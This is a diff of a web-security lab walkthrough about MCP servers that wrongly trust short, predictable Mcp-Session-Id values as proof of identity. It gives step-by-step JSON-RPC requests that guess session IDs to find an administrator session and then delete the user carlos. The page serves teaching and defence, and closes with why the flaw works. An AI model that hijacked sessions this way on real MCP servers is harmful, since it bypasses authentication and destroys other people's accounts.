@@ -6,86 +6,45 @@ permalink: /labs/mcp-session-id-used-for-authentication/
 
 # MCP Session ID Used for Authentication
 
-## Lab
+## Goal
 
-**Name:** MCP session ID used for authentication
-**Goal:** Delete `carlos` using the administrator's existing MCP session.
+Use the lab's predictable MCP session identifiers to find an administrator session and delete `carlos`.
 
-## Initial Setup
+## Walkthrough
 
-Log in as `wiener` and obtain the API key from `/my-account`.
+1. Sign in as `wiener`, open `/my-account`, and copy the API key.
+2. Initialize `/mcp` with the API key. Record the `Mcp-Session-Id` returned by the lab; the example response uses a short numeric value. Reuse this session for normal requests so you can see the expected header and response format.
+3. Send `tools/list` and confirm the server is responding to MCP requests. The lab's flaw is that the session identifier itself is short and predictable, and the server uses it to select a privileged session.
+4. In Burp Repeater, call `list_users` with no bearer token and replace `Mcp-Session-Id` with candidate values from the lab's small session range. Test candidates manually within this lab; do not send these requests to any other service.
 
-Initialize `/mcp` with that API key:
+   ```http
+   Content-Type: application/json
+   Mcp-Session-Id: <candidate-session-id>
+   ```
 
-```http
-Authorization: Bearer <Wiener API key>
-Content-Type: application/json
-Mcp-Session-Id: not yet issued
-```
+   ```json
+   {
+     "jsonrpc":"2.0",
+     "id":10,
+     "method":"tools/call",
+     "params":{"name":"list_users","arguments":{}}
+   }
+   ```
 
-The initialization response contains a short `Mcp-Session-Id`, for example:
+5. Compare the tool results. The administrator's session can list `administrator`, `wiener`, and `carlos`; ordinary or invalid session IDs do not return that privileged result. Record the candidate that produces the administrator result.
+6. Replace `list_users` with `delete_user`, keep the discovered session ID, and target `carlos`:
 
-```text
-Mcp-Session-Id: 797767
-```
+   ```json
+   {
+     "jsonrpc":"2.0",
+     "id":11,
+     "method":"tools/call",
+     "params":{"name":"delete_user","arguments":{"username":"carlos"}}
+   }
+   ```
 
-The session ID must be included in subsequent MCP requests. The lab demonstrates that the server may use the session ID itself to establish authorization.
+7. `Deleted carlos` confirms the lab is solved.
 
-## Discover the Administrator Session
+## Why it works
 
-Session IDs in this lab are issued from a small predictable range. Send `tools/call` requests containing `list_users` and candidate session IDs, without relying on an API key.
-
-```json
-{
-  "jsonrpc":"2.0",
-  "id":10,
-  "method":"tools/call",
-  "params": {
-    "name": "list_users",
-    "arguments": {}
-  }
-}
-```
-
-Include one candidate at a time:
-
-```http
-Mcp-Session-Id: <candidate>
-Content-Type: application/json
-```
-
-The administrator session differs from customer sessions because it can successfully call `list_users` and return:
-
-```text
-administrator
-wiener
-carlos
-```
-
-## Delete the Target
-
-Use the discovered administrator session ID to call `delete_user`:
-
-```json
-{
-  "jsonrpc":"2.0",
-  "id":11,
-  "method":"tools/call",
-  "params": {
-    "name": "delete_user",
-    "arguments": {
-      "username": "carlos"
-    }
-  }
-}
-```
-
-Include the administrator `Mcp-Session-Id` header. The result should be:
-
-```text
-Deleted carlos
-```
-
-## Key Takeaway
-
-Session identifiers must be high entropy and must never act as a weak or predictable substitute for authentication and authorization. Session ownership should be enforced for every MCP request.
+The server treats possession of a session ID as proof of identity, but the ID is predictable. A session identifier should only reference server-side state; it must not replace authentication or per-request authorization.
